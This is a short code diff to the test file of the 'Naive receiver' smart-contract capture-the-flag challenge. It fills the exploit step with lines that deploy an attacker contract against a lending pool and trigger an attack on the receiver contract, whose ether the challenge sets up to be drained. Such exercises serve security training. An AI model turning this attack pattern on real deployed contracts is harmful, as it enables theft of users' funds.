@@ -11,6 +11,7 @@ describe('[Challenge] Naive receiver', function () {
     const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
 
     before(async function () {
+        this.timeout(2000);
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, attacker] = await ethers.getSigners();
 
@@ -30,7 +31,8 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        const attackerContract = await (await ethers.getContractFactory('NaiveReceiverAttacker', attacker)).deploy(this.pool.address);
+        await attackerContract.connect(attacker).attack(this.receiver.address, 10);
     });
 
     after(async function () {
